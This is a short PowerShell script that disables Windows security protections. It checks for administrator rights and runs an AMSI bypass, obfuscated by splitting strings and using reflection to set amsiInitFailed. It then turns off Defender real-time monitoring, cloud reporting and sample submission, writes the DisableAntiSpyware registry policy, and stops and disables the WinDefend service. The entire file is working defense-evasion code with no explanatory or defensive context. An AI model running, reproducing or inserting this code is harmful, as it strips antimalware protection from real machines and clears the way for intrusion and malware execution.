# Ensure script is running with administrator privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator")) {
    Write-Warning "You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator."
    exit
}

# AMSI Bypass with basic obfuscation
$Type = [Ref].Assembly.GetType(('System.' + 'Management.' + 'Automation.' + 'AmsiUtils'))
$Field = $Type.GetField(('amsi' + 'Init' + 'Failed'), 'NonPublic,Static')
$Field.SetValue($null, $true)

# Disable Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Windows Defender cloud protection and sample submission
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent 2

# Disable Windows Defender permanently via Registry
If (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender")) {
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force
}

Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force

# Stop and disable Windows Defender service
Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Set-Service -Name WinDefend -StartupType Disabled

# Confirm Defender status
$service = Get-Service -Name WinDefend
if ($service.Status -eq 'Stopped') {
    Write-Host "Windows Defender service has been disabled successfully."
} else {
    Write-Host "Failed to disable Windows Defender service."
}
